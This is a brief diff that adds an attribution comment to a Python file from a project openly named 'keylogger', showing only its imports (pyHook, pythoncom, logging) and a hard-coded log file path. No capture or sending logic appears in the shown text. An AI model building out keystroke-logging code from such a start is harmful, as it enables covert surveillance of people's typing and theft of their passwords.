@@ -1,3 +1,5 @@
+# 'keylogger' project by Suriyaa Kudo @ https://github.com/SuriyaaKudoIsc/keylogger
+
 import pyHook, pythoncom, sys, logging
 
 file_log = 'C:\\Users\\Suriyaa\\Downloads\\log.txt'
